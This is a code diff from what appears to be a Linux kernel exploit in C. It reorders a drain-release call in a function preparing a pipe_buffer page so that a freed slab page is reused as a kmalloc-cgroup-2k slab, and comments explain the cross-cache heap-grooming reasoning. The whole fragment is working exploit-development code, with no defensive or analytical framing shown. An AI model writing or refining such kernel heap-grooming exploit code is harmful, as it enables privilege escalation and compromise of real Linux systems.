@@ -361,7 +361,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
    * instead of leaving it frozen on the per-CPU list where it was reused with
    * inuse=32 obj=32 frozen=1. 16 order-3 skb sends then take the freed page and
    * the skb close hands it back to the buddy (pcp LIFO), so the ring pipe
-   * arrays get it as a fresh kmalloc-cgroup-2k slab. */
+   * arrays get it as a fresh kmalloc-cgroup-2k slab. The drain's held trigger
+   * objects are released only after the ring allocations: freeing them first
+   * would hand ~24 extra slabs to the buddy and the sends/rings would take
+   * those instead of the freed page. */
   int skb_sv[2] = {-1, -1};
   if (socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv) != 0) {
     skb_sv[0] = -1;
@@ -397,7 +400,6 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     free(skb_page_buf);
     return 0;
   }
-  release_controlled_mm_drain(&st);
 
   int reclaim_sent = 0;
   if (skb_page_buf) {
@@ -417,10 +419,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
     if (alloc_pipe_object(pipe_fds_reclaim[i]) != 0) {
       pr_warning("p0 pipe ring alloc failed reclaim=%zu\n", i);
+      release_controlled_mm_drain(&st);
       free(skb_page_buf);
       return 0;
     }
   }
+  release_controlled_mm_drain(&st);
 
   /* [pipefix] budget plan (campaign 13/15/16 arithmetic): F_SETPIPE_SZ
    * growth is charged per-real-uid against fs.pipe-user-pages-soft, and
